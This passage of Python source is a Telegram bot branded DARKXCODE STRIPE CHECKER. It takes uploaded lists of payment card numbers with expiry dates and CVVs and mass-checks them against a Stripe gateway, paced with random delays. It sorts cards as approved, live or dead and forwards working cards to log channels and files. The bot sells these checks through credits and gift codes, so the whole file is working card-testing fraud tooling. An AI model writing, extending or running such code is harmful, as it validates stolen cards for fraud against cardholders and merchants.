            "2. Then use <code>/mchk</code>\n\n"
            "Or click Upload File button below.",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        return

    # Get file info
    file_info = files_storage[user_id]
    cards = file_info["cards"]
    
    # Check if user has enough credits
    if user.get("credits", 0) < len(cards):
        await update.message.reply_text(
            f"💰 <b>INSUFFICIENT CREDITS</b>\n"
            f"Cards to check: {len(cards)}\n"
            f"Credits needed: {len(cards)}\n"
            f"Your credits: {user.get('credits', 0)}\n\n"
            f"You need {len(cards) - user.get('credits', 0)} more credits.",
            parse_mode=ParseMode.HTML)
        return

    # Create status message
    status_msg = await update.message.reply_text(
        f"⚡ <b>Starting Public Mass Check</b>\n"
        f"File ID: <code>{file_info['file_id']}</code>\n"
        f"Cards: {len(cards)}\n"
        f"Credits: {user.get('credits', 0)}\n\n"
        f"<i>Processing cards...</i>",
        parse_mode=ParseMode.HTML
    )

    # Start mass check task
    task = asyncio.create_task(
        public_mass_check_task(user_id, cards, status_msg, update.message.chat_id, context))
    
    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "is_private": False,
        "start_time": time.time(),
        "approved": 0,
        "live": 0,
        "dead": 0,
        "ccn": 0,
        "cvv": 0
    }

async def public_mass_check_task(user_id, cards, status_msg, chat_id, context):
    """Public mass checking with channel forwarding"""
    if user_id not in files_storage:
        await status_msg.edit_text("❌ File data not found")
        return

    file_info = files_storage[user_id]
    file_id = file_info["file_id"]
    username = file_info["username"]
    
    # Initialize hits collections
    approved_hits = []
    live_hits = []
    
    processed = 0
    approved = 0
    live = 0
    dead = 0
    ccn = 0
    cvv = 0
    
    # Process cards
    for i, card in enumerate(cards):
        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
            break

        # Update status every 5 cards
        if i % 5 == 0 or i == len(cards) - 1:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
            progress = (processed / len(cards)) * 100
            
            status_text = f"""🔒 PRIVATE MASS CHECK
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved}
🔥 Live: {live}
❌ Dead: {dead}
━━━━━━━━━━━━━━━━━━━━
"""
            try:
                await status_msg.edit_text(status_text)
            except:
                pass

        # Check card
        start_time = time.time()
        result_card, status, message, http_code = await check_single_card_fast(card)
        actual_time = time.time() - start_time
        
        processed += 1
        
        # Update counters
        if status == "approved":
            approved += 1
            approved_hits.append(card)
            save_hit_card(user_id, card, "approved", is_private=True)
        elif status == "live":
            live += 1
            live_hits.append(card)
            save_hit_card(user_id, card, "live", is_private=True)
        elif status == "dead":
            dead += 1
        elif status == "ccn":
            ccn += 1
        elif status == "cvv":
            cvv += 1
        
        # Forward hits to channels
        if status in ["approved", "live"]:
            # Send to user
            result_text = format_universal_result(
                card_data=card,
                status=status,
                message=message,
                gateway="Stripe Gateway",
                username=username,
                time_taken=actual_time
            )
            await context.bot.send_message(
                chat_id=chat_id, 
                text=result_text, 
                parse_mode=ParseMode.HTML
            )
            
            # Forward to private channel
            await send_to_log_channel(context, card, status, username, is_private=True)
        
        # Small delay
        if i < len(cards) - 1:
            await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Create summary files
    if approved_hits:
        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
        with open(private_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_hits))
    
    if live_hits:
        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
        with open(private_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(live_hits))
    
    # Send files to channels if enough hits
    try:
        if approved_hits and len(approved_hits) >= 5:
            approved_content = "\n".join(approved_hits)
            approved_file = BytesIO(approved_content.encode())
            approved_file.name = f"{file_id}_approved.txt"
            await context.bot.send_document(
                chat_id=APPROVED_LOG_CHANNEL,
                document=approved_file,
                caption=f"✅ Private Approved Hits\nFile: {file_id}\nUser: @{username}\nCount: {approved}"
            )
        
        if live_hits and len(live_hits) >= 5:
            live_content = "\n".join(live_hits)
            live_file = BytesIO(live_content.encode())
            live_file.name = f"{file_id}_live.txt"
            await context.bot.send_document(
                chat_id=LIVE_LOG_CHANNEL,
                document=live_file,
                caption=f"🔥 Private Live Hits\nFile: {file_id}\nUser: @{username}\nCount: {live}"
            )
    except Exception as e:
        logger.error(f"Error sending files to channels: {e}")
    
    # Final summary
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    summary = f"""✅ PRIVATE MASS CHECK COMPLETE
Total Cards: {len(cards)}
Processed: {processed}
Time: {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━
FINAL RESULTS:
✅ Approved: {approved} cards
🔥 Live: {live} cards
❌ Dead: {dead} cards
🔢 CCN: {ccn} cards
💳 CVV: {cvv} cards
━━━━━━━━━━━━━━━━━━━━
• User: @{username}
━━━━━━━━━━━━━━━━━━━━
🤖 @DARKXCODE_STRIPE_BOT
"""
    
    await status_msg.edit_text(summary)
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]
    if user_id in files_storage:
        del files_storage[user_id]

async def private_mass_check_task(user_id, cards, status_msg, chat_id, context):
    """Private mass checking with channel forwarding"""
    if user_id not in files_storage:
        await status_msg.edit_text("❌ File data not found")
        return

    file_info = files_storage[user_id]
    file_id = file_info["file_id"]
    username = file_info["username"]
    
    # Initialize hits collections
    approved_hits = []
    live_hits = []
    
    processed = 0
    approved = 0
    live = 0
    dead = 0
    ccn = 0
    cvv = 0
    
    # Process cards
    for i, card in enumerate(cards):
        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
            break

        # Update status every 5 cards
        if i % 5 == 0 or i == len(cards) - 1:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
            progress = (processed / len(cards)) * 100
            
            status_text = f"""🔒 PRIVATE MASS CHECK
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved}
🔥 Live: {live}
❌ Dead: {dead}
━━━━━━━━━━━━━━━━━━━━"""
            try:
                await status_msg.edit_text(status_text)
            except:
                pass

        # Check card
        start_time = time.time()
        result_card, status, message, http_code = await check_single_card_fast(card)
        actual_time = time.time() - start_time
        
        processed += 1
        
        # Update counters
        if status == "approved":
            approved += 1
            approved_hits.append(card)
            save_hit_card(user_id, card, "approved", is_private=True)
        elif status == "live":
            live += 1
            live_hits.append(card)
            save_hit_card(user_id, card, "live", is_private=True)
        elif status == "dead":
            dead += 1
        elif status == "ccn":
            ccn += 1
        elif status == "cvv":
            cvv += 1
        
        # Forward hits to channels
        if status in ["approved", "live"]:
            # Send to user
            result_text = format_universal_result(
                card_data=card,
                status=status,
                message=message,
                gateway="Stripe Gateway",
                username=username,
                time_taken=actual_time
            )
            await context.bot.send_message(
                chat_id=chat_id, 
                text=result_text, 
                parse_mode=ParseMode.HTML
            )
            
            # Forward to private channel
            await send_to_log_channel(context, card, status, username, is_private=True)
        
        # Small delay
        if i < len(cards) - 1:
            await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Create summary files
    if approved_hits:
        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
        with open(private_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_hits))
    
    if live_hits:
        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
        with open(private_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(live_hits))
    
    # Send files to channels if enough hits
    try:
        if approved_hits and len(approved_hits) >= 5:
            approved_content = "\n".join(approved_hits)
            approved_file = BytesIO(approved_content.encode())
            approved_file.name = f"{file_id}_approved.txt"
            await context.bot.send_document(
                chat_id=APPROVED_LOG_CHANNEL,
                document=approved_file,
                caption=f"✅ Private Approved Hits\nFile: {file_id}\nUser: @{username}\nCount: {approved}"
            )
        
        if live_hits and len(live_hits) >= 5:
            live_content = "\n".join(live_hits)
            live_file = BytesIO(live_content.encode())
            live_file.name = f"{file_id}_live.txt"
            await context.bot.send_document(
                chat_id=LIVE_LOG_CHANNEL,
                document=live_file,
                caption=f"🔥 Private Live Hits\nFile: {file_id}\nUser: @{username}\nCount: {live}"
            )
    except Exception as e:
        logger.error(f"Error sending files to channels: {e}")
    
    # Final summary
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    summary = f"""✅ PRIVATE MASS CHECK COMPLETE
Total Cards: {len(cards)}
Processed: {processed}
Time: {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━
FINAL RESULTS:
✅ Approved: {approved} cards
🔥 Live: {live} cards
❌ Dead: {dead} cards
🔢 CCN: {ccn} cards
💳 CVV: {cvv} cards
━━━━━━━━━━━━━━━━━━━━
• User: @{username}
━━━━━━━━━━━━━━━━━━━━
🤖 @DARKXCODE_STRIPE_BOT
"""
    
    await status_msg.edit_text(summary)
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]
    if user_id in files_storage:
        del files_storage[user_id]

async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Regular mass check - NO channel forwarding - IMPROVED"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"

    if not user.get('joined_channel', False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start")
        return

    if user_id not in files_storage:
        # Show upload instructions
        keyboard = [[
            InlineKeyboardButton("📁 Upload File", callback_data="upload_help")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📁 <b>No File Found</b>\n"
            "══════════════════════\n"
            "Please upload a .txt file with cards first.\n\n"
            "<b>File Format:</b>\n"
            "<code>cc|mm|yy|cvv</code>\n"
            "<code>cc|mm|yy|cvv</code>\n"
            "(one card per line)\n\n"
            "<b>Steps:</b>\n"
            "1. Upload a .txt file\n"
            "2. Then use <code>/mchk</code>\n\n"
            "Or click Upload File button below.",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        return

    # Get file info
    file_info = files_storage[user_id]
    cards = file_info["cards"]
    
    # Check if user has enough credits
    if user.get("credits", 0) < len(cards):
        await update.message.reply_text(
            f"💰 <b>INSUFFICIENT CREDITS</b>\n"
            f"Cards to check: {len(cards)}\n"
            f"Credits needed: {len(cards)}\n"
            f"Your credits: {user.get('credits', 0)}\n\n"
            f"You need {len(cards) - user.get('credits', 0)} more credits.",
            parse_mode=ParseMode.HTML)
        return

    # Create status message
    status_msg = await update.message.reply_text(
        f"⚡ <b>Starting Public Mass Check</b>\n"
        f"File ID: <code>{file_info['file_id']}</code>\n"
        f"Cards: {len(cards)}\n"
        f"Credits: {user.get('credits', 0)}\n\n"
        f"<i>Processing cards...</i>",
        parse_mode=ParseMode.HTML
    )

    # Start private mass check task
    task = asyncio.create_task(
        private_mass_check_task(user_id, cards, status_msg, update.message.chat_id, context))
    
    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "is_private": False,
        "start_time": time.time(),
        "approved": 0,
        "live": 0,
        "dead": 0,
        "ccn": 0,
        "cvv": 0
    }


async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id,
                                    context):
    """Mass checking with file logging"""
    if user_id not in files_storage:
        await status_msg.edit_text("❌ File data not found. Please upload file again.")
        return

    file_info = files_storage[user_id]
    file_id = file_info["file_id"]
    hits_file = file_info["hits_file"]
    
    # Initialize hits files
    approved_hits = []
    live_hits = []
    
    processed = 0
    approved = 0
    live = 0
    dead = 0
    ccn = 0
    cvv = 0
    
    # Process cards
    for i, card in enumerate(cards):
        # Check if cancelled
        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
            break

        # Update status every 5 cards
        if i % 5 == 0 or i == len(cards) - 1:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
            progress = (processed / len(cards)) * 100
            
            status_text = f"""🚀 Mass Check Progress
File ID: {file_id}
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}

Results:
✅ Approved: {approved}
🔥 Live: {live}
❌ Dead: {dead}
🔢 CCN: {ccn}
💳 CVV: {cvv}
"""
            try:
                await status_msg.edit_text(status_text)
            except:
                pass

        # Check card (NO LUHN VALIDATION)
        start_time = time.time()
        result_card, status, message, http_code = await check_single_card_fast(card)
        actual_time = time.time() - start_time
        
        processed += 1
        
        # Update counters
        if status == "approved":
            approved += 1
            approved_hits.append(card)
        elif status == "live":
            live += 1
            live_hits.append(card)
        elif status == "dead":
            dead += 1
        elif status == "ccn":
            ccn += 1
        elif status == "cvv":
            cvv += 1
        
        # Send individual result for approved/live cards
        if status in ["approved", "live"]:
            result_text = format_universal_result(
                card_data=card,
                status=status,
                message=message,
                gateway="Stripe Gateway",
                username=file_info["username"],
                time_taken=actual_time
            )
            await context.bot.send_message(chat_id=APPROVED_LOG_CHANNEL, text=result_text, parse_mode=ParseMode.HTML)
        
        # Small delay
        if i < len(cards) - 1:
            await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Save hits to files
    if approved_hits:
        with open(f"{HITS_FOLDER}/{file_id}_approved.txt", 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_hits))
    
    if live_hits:
        with open(f"{HITS_FOLDER}/{file_id}_live.txt", 'w', encoding='utf-8') as f:
            f.write("\n".join(live_hits))
    
    # Send files to log channels
    try:
        # Send approved hits to approved channel
        if approved_hits and APPROVED_LOG_CHANNEL:
            approved_content = "\n".join(approved_hits)
            approved_file = BytesIO(approved_content.encode())
            approved_file.name = f"{file_id}_approved.txt"
            await context.bot.send_document(
                chat_id=APPROVED_LOG_CHANNEL,
                document=approved_file,
                caption=f"✅ Approved Cards\nFile ID: {file_id}\nUser: @{file_info['username']}\nCount: {approved}"
            )
        
        # Send live hits to live channel
        if live_hits and LIVE_LOG_CHANNEL:
            live_content = "\n".join(live_hits)
            live_file = BytesIO(live_content.encode())
            live_file.name = f"{file_id}_live.txt"
            await context.bot.send_document(
                chat_id=LIVE_LOG_CHANNEL,
                document=live_file,
                caption=f"🔥 Live Cards\nFile ID: {file_id}\nUser: @{file_info['username']}\nCount: {live}"
            )
    except Exception as e:
        logger.error(f"Error sending to log channels: {e}")
    
    # Final summary
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    summary = f"""✅ Mass Check Complete
File ID: {file_id}
Total Cards: {len(cards)}
Processed: {processed}

Final Results:
✅ Approved: {approved} cards
🔥 Live: {live} cards
❌ Dead: {dead} cards
🔢 CCN: {ccn} cards
💳 CVV: {cvv} cards

⏱ Time: {elapsed:.1f}s
📁 Files sent to log channels
🤖 @DARKXCODE_STRIPE_BOT
"""
    
    await status_msg.edit_text(summary)
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]
    if user_id in files_storage:
        del files_storage[user_id]


async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /claim command for gift codes"""
    user_id = update.effective_user.id
    user = await get_user(user_id)

    if not user['joined_channel']:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN)
        return

    if not context.args:
        await update.message.reply_text(
            "*❌ Usage:* `/claim CODE`\n\n"
            "*Example:* `/claim ABC123XYZ456DEF7`\n\n"
            "Ask admin for gift codes or wait for announcements.",
            parse_mode=ParseMode.MARKDOWN)
        return

    code = context.args[0].upper().strip()

    # Check if code exists
    gift_code = await get_gift_code(code)
    if not gift_code:
        await update.message.reply_text(
            f"*❌ INVALID GIFT CODE*\n\n"
            f"Code `{code}` not found or expired.\n"
            f"Make sure you entered it correctly.",
            parse_mode=ParseMode.MARKDOWN)
        return

    # Check if user already claimed this code (Firebase version)
    db = get_db()
    if db:
        try:
            claimed_ref = db.collection('user_claimed_codes').document(
                f"{user_id}_{code}")
            claimed_doc = claimed_ref.get()

            if claimed_doc.exists:
                await update.message.reply_text(
                    f"*❌ ALREADY CLAIMED*\n\n"
                    f"You have already claimed gift code `{code}`.\n"
                    f"Each user can claim a code only once.",
                    parse_mode=ParseMode.MARKDOWN)
                return
        except Exception as e:
            logger.error(f"Firebase error checking claimed codes: {e}")
    else:
        # In-memory check
        if user_id in in_memory_claimed_codes and code in in_memory_claimed_codes[
                user_id]:
            await update.message.reply_text(
                f"*❌ ALREADY CLAIMED*\n\n"
                f"You have already claimed gift code `{code}`.\n"
                f"Each user can claim a code only once.",
                parse_mode=ParseMode.MARKDOWN)
            return

    # Check max uses
    if gift_code['max_uses'] and gift_code['uses'] >= gift_code['max_uses']:
        await update.message.reply_text(
            f"*❌ CODE LIMIT REACHED*\n\n"
            f"Code `{code}` has been claimed too many times.",
            parse_mode=ParseMode.MARKDOWN)
        return

    # Add credits to user
    credits_to_add = gift_code['credits']
    await update_user(user_id, {'credits': user['credits'] + credits_to_add})

    # Update gift code usage
    await update_gift_code_usage(code, user_id)

    # Refresh user data
    user = await get_user(user_id)

    await update.message.reply_text(
        f"*🎉 GIFT CODE CLAIMED!*\n"
        f"══════════════════════\n"
        f"*Code:* `{code}`\n"
        f"*Credits added:* {credits_to_add}\n"
        f"*New balance:* {user['credits']} credits\n\n"
        f"Thank you for using {BOT_INFO['name']}!",
        parse_mode=ParseMode.MARKDOWN)


# ==================== ADMIN COMMANDS ====================


async def addcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Add credits to user"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/addcr user_id amount`\n"
            "*Example:* `/addcr 123456789 100`",
            parse_mode=ParseMode.MARKDOWN)
        return

    try:
        target_user_id = int(context.args[0])
        amount = int(context.args[1])

        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return

        user = await get_user(target_user_id)
        await update_user(target_user_id,
                          {'credits': user['credits'] + amount})
        user = await get_user(target_user_id)  # Refresh

        await update.message.reply_text(
            f"*✅ CREDITS ADDED*\n"
            f"══════════════════════\n"
            f"*User:* `{target_user_id}`\n"
            f"*Added:* {amount} credits\n"
            f"*New Balance:* {user['credits']} credits",
            parse_mode=ParseMode.MARKDOWN)

        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"*🎉 CREDITS ADDED*\n\n"
                f"You received *{amount} credits* from admin!\n"
                f"New balance: *{user['credits']} credits*",
                parse_mode=ParseMode.MARKDOWN)
        except:
            pass  # User might have blocked bot

    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")


async def gengift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Generate gift code"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/gengift credits max_uses`\n"
            "*Example:* `/gengift 50 10`\n"
            "Creates a code worth 50 credits, usable 10 times.",
            parse_mode=ParseMode.MARKDOWN)
        return

    try:
        credits = int(context.args[0])
        max_uses = int(context.args[1])

        if credits <= 0 or max_uses <= 0:
            await update.message.reply_text(
                "❌ Credits and max uses must be positive.")
            return

        # Generate unique code
        code = generate_gift_code()
        gift_code = await get_gift_code(code)
        while gift_code:
            code = generate_gift_code()
            gift_code = await get_gift_code(code)

        # Create gift code
        await create_gift_code(code, credits, max_uses, user_id)

        await update.message.reply_text(
            f"*🎁 GIFT CODE GENERATED*\n"
            f"══════════════════════\n"
            f"*Code:* `{code}`\n"
            f"*Credits:* {credits}\n"
            f"*Max Uses:* {max_uses}\n"
            f"*Created:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"Share with users:\n"
            f"`/claim {code}`",
            parse_mode=ParseMode.MARKDOWN)

    except ValueError:
        await update.message.reply_text("❌ Invalid credits or max uses.")


async def listgifts_command(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    """Admin: List all gift codes"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    gift_codes_list = await get_all_gift_codes()

    if not gift_codes_list:
        await update.message.reply_text("📭 No gift codes generated yet.")
        return

    response = "*🎁 ACTIVE GIFT CODES*\n══════════════════════\n"

    for gift in gift_codes_list[:20]:
        uses_left = gift.get('max_uses', 0) - gift.get(
            'uses', 0) if gift.get('max_uses') else 'Unlimited'
        uses = gift.get('uses', 0)
        credits = gift.get('credits', 0)
        code = gift.get('code', 'Unknown')
        response += f"• `{code}` - {credits} credits ({uses}/{uses_left} used)\n"

    if len(gift_codes_list) > 20:
        response += f"\n... and {len(gift_codes_list) - 20} more codes"

    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command - Cancel ongoing mass check"""
    user_id = update.effective_user.id

    if user_id not in checking_tasks:
        await update.message.reply_text(
            "*ℹ️ NO ACTIVE CHECK*\n"
            "You don't have any ongoing mass check.",
            parse_mode=ParseMode.MARKDOWN)
        return

    if checking_tasks[user_id]["cancelled"]:
        await update.message.reply_text(
            "*ℹ️ ALREADY CANCELLED*\n"
            "Your mass check is already being cancelled.",
            parse_mode=ParseMode.MARKDOWN)
        return

    checking_tasks[user_id]["cancelled"] = True

    await update.message.reply_text(
        "*🛑 CANCELLATION REQUESTED*\n"
        "Your mass check will be cancelled shortly.\n"
        "You'll receive a summary when it's complete.",
        parse_mode=ParseMode.MARKDOWN)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    # Get user ID from either message or callback query
    if update.message:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or "User"
    elif update.callback_query:
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or "User"
    else:
        return

    # Get user data
    user = await get_user(user_id)

    # Different help for admin vs regular users
    if user_id in ADMIN_IDS:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    else:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    # Send the message using HTML parsing
    try:
        if update.message:
            await update.message.reply_text(
                help_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back",
                                         callback_data="back_to_start")
                ]]))
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back",
                                         callback_data="back_to_start")
                ]]))
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        # Fallback to plain text
        if update.message:
            await update.message.reply_text(
                help_text.replace('<b>', '').replace('</b>', '').replace(
                    '<code>', '').replace('</code>', ''),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back",
                                         callback_data="back_to_start")
                ]]))
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text.replace('<b>', '').replace('</b>', '').replace(
                    '<code>', '').replace('</code>', ''),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back",
                                         callback_data="back_to_start")
                ]]))


async def verify_join_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle verify join callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    await update_user(user_id, {'joined_channel': True})

    await query.edit_message_text(
        "*✅ ACCESS GRANTED*\n"
        "══════════════════════\n"
        "Channel membership verified successfully!\n"
        "You now have full access to all features.\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN)


async def claim_gift_callback(update: Update,
                              context: ContextTypes.DEFAULT_TYPE):
    """Handle claim gift callback"""
    query = update.callback_query

    try:
        await query.answer("Use /claim CODE to redeem gift code")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*💰 CLAIM GIFT CODE*\n"
        "══════════════════════\n"
        "To claim a gift code, use:\n"
        "`/claim CODE`\n\n"
        "*Example:*\n"
        "`/claim ABC123XYZ456DEF7`\n\n"
        "*Note:* Each code can be claimed only once per user.\n"
        "Ask admin for gift codes or wait for announcements.",
        parse_mode=ParseMode.MARKDOWN)


async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /userinfo command - Admin view user info"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    if user_id not in ADMIN_IDS:
        await message.reply_text("❌ This command is for administrators only.",
                                 parse_mode=ParseMode.HTML)
        return

    if not context.args:
        await message.reply_text(
            "<b>❌ Usage:</b> <code>/userinfo user_id</code>\n"
            "<b>Example:</b> <code>/userinfo 123456789</code>",
            parse_mode=ParseMode.HTML)
        return

    try:
        target_user_id = int(context.args[0])
        user = await get_user(target_user_id)

        # Get claimed codes from Firebase
        claimed_codes = []
        db_connection = get_db()
        if db_connection:
            try:
                claimed_ref = db_connection.collection('user_claimed_codes')
                claimed_docs = claimed_ref.where('user_id', '==',
                                                 target_user_id).stream()

                for doc in claimed_docs:
                    data = doc.to_dict()
                    if 'code' in data:
                        claimed_codes.append(data['code'])
            except Exception as e:
                logger.error(f"Error fetching claimed codes: {e}")

        # Calculate success rate
        total_user_checks = user.get('total_checks', 0)
        approved_cards = user.get('approved_cards', 0)
        success_rate = (approved_cards / total_user_checks *
                        100) if total_user_checks > 0 else 0

        # Get referrer info if exists
        referrer_info = ""
        if user.get('referrer_id'):
            referrer = await get_user(user['referrer_id'])
            referrer_name = referrer.get('username', 'N/A')
            referrer_info = f"\n<b>Referred by:</b> @{referrer_name} ({user['referrer_id']})"

        # Format dates
        joined_date = user.get('joined_date', 'N/A')
        if isinstance(joined_date, datetime.datetime):
            joined_date = joined_date.strftime('%Y-%m-%d')
        elif isinstance(joined_date, str) and len(joined_date) >= 10:
            joined_date = joined_date[:10]

        last_active = user.get('last_active', 'Never')
        if isinstance(last_active, datetime.datetime):
            last_active = last_active.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(last_active, str) and len(last_active) >= 19:
            last_active = last_active[:19]

        user_info = f"""<b>👤 USER INFO (ADMIN)</b>
══════════════════════
<b>User ID:</b> <code>{target_user_id}</code>
<b>Username:</b> @{user.get('username', 'N/A')}
<b>Name:</b> {user.get('first_name', 'N/A')}
<b>Joined:</b> {joined_date}
<b>Channel:</b> {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
<b>Last Active:</b> {last_active}
{referrer_info}

<b>Credits:</b> {user.get('credits', 0)}
<b>Credits Spent:</b> {user.get('credits_spent', 0)}

<b>Statistics:</b>
• Total Checks: {total_user_checks}
• Today's Checks: {user.get('checks_today', 0)}
• 🔥 Charge: {approved_cards}
• ❌ Declined: {user.get('declined_cards', 0)}
• Success Rate: {success_rate:.1f}%

<b>Referrals:</b> {user.get('referrals_count', 0)} users
<b>Earned from Referrals:</b> {user.get('earned_from_referrals', 0)} credits

<b>Claimed Codes:</b> {len(claimed_codes)}
══════════════════════
"""
        if claimed_codes:
            user_info += "\n<b>Claimed Gift Codes:</b>\n"
            for code in claimed_codes[:10]:
                user_info += f"• <code>{code}</code>\n"
            if len(claimed_codes) > 10:
                user_info += f"• ... and {len(claimed_codes) - 10} more\n"

        await message.reply_text(user_info, parse_mode=ParseMode.HTML)

    except ValueError:
        await message.reply_text("❌ Invalid user ID.",
                                 parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in userinfo_command: {e}")
        await message.reply_text(
            "❌ An error occurred while fetching user info.",
            parse_mode=ParseMode.HTML)
            
# ==================== ADD MISSING MASS CHECK CALLBACK ====================

# ==================== MISSING CALLBACK FUNCTIONS ====================


async def start_mass_check_callback(update: Update,
                                    context: ContextTypes.DEFAULT_TYPE):
    """Start mass check from callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id

    if user_id not in files_storage or "cards" not in files_storage[user_id]:
        await query.edit_message_text(
            "❌ No cards found. Please upload file again.")
        return

    cards = files_storage[user_id]["cards"]
